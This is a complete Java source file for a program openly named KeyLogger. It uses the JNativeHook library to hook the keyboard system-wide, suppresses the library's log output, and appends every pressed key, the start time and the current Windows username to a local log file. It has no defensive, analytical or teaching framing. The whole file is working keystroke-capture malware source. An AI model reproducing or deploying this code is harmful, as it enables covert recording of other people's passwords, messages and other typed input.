package cf.lucasmellof.keylogger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.nio.file.Paths;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.logging.Level;

public class KeyLogger implements NativeKeyListener {
    //only put file name without extension
    private static LogManager log = new LogManager(Paths.get("data").toFile(), "keys");
    public static final Logger logger = LoggerFactory.getLogger(KeyLogger.class);

    public static void main(String[] args) {

        logger.info(" > Starting KeyLogger");
        logger.info(" > KeyLogger has been started");
        logger.info(" > Defining some variables at Logger");
        init();
        logger.info(" > Registering GlobalScreen native hook");
        try {
            GlobalScreen.registerNativeHook();
            logger.info(" - GlobalScreen native hook has been registered");
        } catch (NativeHookException e) {
            logger.info(" - Error registering GlobalScreen native hook, printing error");
            logger.error(e.getMessage(), e);
            logger.info("> Exiting program");
            System.exit(-1);
        }
        logger.info(" > Adding KeyLogger as GlobalScreen listener");
        GlobalScreen.addNativeKeyListener(new KeyLogger());
        log.log("Starting KeyLogger - " + new SimpleDateFormat("EEEEE MMMMM yyyy HH:mm:ss", new Locale("pt", "BR")).format(new Date()) + " - " + System.getenv("username"));
    }

    private static void init() {
        java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.WARNING);
        logger.setUseParentHandlers(false);
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {

    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
        log.log("[" + keyText + "]");

    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {

    }
}
